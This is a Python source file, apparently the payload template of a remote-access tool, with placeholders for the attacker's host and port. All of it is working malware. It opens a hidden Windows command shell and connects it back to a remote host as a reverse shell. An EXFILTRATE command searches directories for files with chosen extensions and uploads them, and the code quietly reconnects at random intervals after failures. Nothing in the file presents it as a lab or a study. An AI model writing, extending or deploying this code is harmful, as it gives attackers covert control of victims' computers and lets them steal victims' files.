# payload.py
# The Heartbeat Soul, Ascended. Communication is now flawless.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
CHUNK_SIZE = 4096
SHELL_READY_SIGNAL = b"<SHELL_READY>"

def send_file_reliably(s_obj, file_path):
    """Sends a single file with lossless protocol."""
    try:
        if not os.path.exists(file_path) or not os.path.isfile(file_path):
            s_obj.sendall(b'FAIL_NOT_FOUND')
            return
            
        file_size = os.path.getsize(file_path)
        
        hasher = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b""):
                hasher.update(chunk)
        file_hash = hasher.hexdigest()

        header = f"{os.path.basename(file_path)}<SEP>{file_size}<SEP>{file_hash}"
        s_obj.sendall(header.encode('utf-8'))

        ack = s_obj.recv(1024).decode('utf-8')
        if ack != 'ACK_HEADER':
            return

        with open(file_path, 'rb') as f:
            s_obj.sendfile(f)
        
        s_obj.recv(1024)

    except Exception:
        try:
            s_obj.sendall(b'FAIL_SEND')
        except:
            pass

def handle_exfiltration(s_obj, command):
    """Finds and sends files based on the exfiltrate command."""
    try:
        _, root_path, extensions_str = command.split('<SEP>')
        extensions = [ext.strip() for ext in extensions_str.split(',')]
        
        found_files = []
        if not os.path.isdir(root_path):
             s_obj.sendall(b"COUNT<SEP>0")
        else:
            for dirpath, _, filenames in os.walk(root_path):
                for filename in filenames:
                    if any(filename.endswith(ext) for ext in extensions):
                        found_files.append(os.path.join(dirpath, filename))
            s_obj.sendall(f"COUNT<SEP>{len(found_files)}".encode('utf-8'))
        
        ack = s_obj.recv(1024).decode('utf-8')
        if ack != 'ACK_COUNT':
            return

        for file_path in found_files:
            send_file_reliably(s_obj, file_path)

    except Exception:
        try:
            s_obj.sendall(b'FAIL_EXFIL')
        except:
            pass
    finally:
        time.sleep(0.1)
        try:
            s_obj.sendall(b'END_EXFIL')
        except:
            pass

def stream_reader(stream, s_obj):
    """Reads from a stream (stdout/stderr) and sends to socket."""
    while True:
        try:
            output = stream.read(1)
            if output:
                s_obj.sendall(output)
            else:
                break
        except:
            break

def run_conduit():
    """The main reverse shell loop with corrected synchronization."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            p = subprocess.Popen(
                ['cmd.exe'], 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                creationflags=0x08000000, # CREATE_NO_WINDOW
                shell=True,
                cwd=os.path.expanduser("~")
            )
            
            threading.Thread(target=stream_reader, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=stream_reader, args=(p.stderr, s_obj), daemon=True).start()
            
            time.sleep(0.5)
            s_obj.sendall(SHELL_READY_SIGNAL)
            s_obj.sendall(os.getcwd().encode('utf-8') + b'>')

            while True:
                data = s_obj.recv(1024)
                if not data:
                    break
                
                command = data.decode('utf-8', errors='ignore').strip()

                if command.startswith('EXFILTRATE<SEP>'):
                    handle_exfiltration(s_obj, command)
                elif command.lower() == 'exit':
                    break
                else:
                    if command.strip().lower().startswith('cd '):
                        try:
                            new_dir = command.strip()[3:]
                            os.chdir(new_dir)
                            s_obj.sendall(b'\n' + os.getcwd().encode('utf-8') + b'>')
                        except Exception as e:
                            s_obj.sendall(str(e).encode() + b'\n' + os.getcwd().encode('utf-8') + b'>')
                    else:
                        p.stdin.write(data + b'\n')
                        p.stdin.flush()
                        time.sleep(0.2)
                        s_obj.sendall(os.getcwd().encode('utf-8') + b'>')

            p.terminate()
            s_obj.close()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()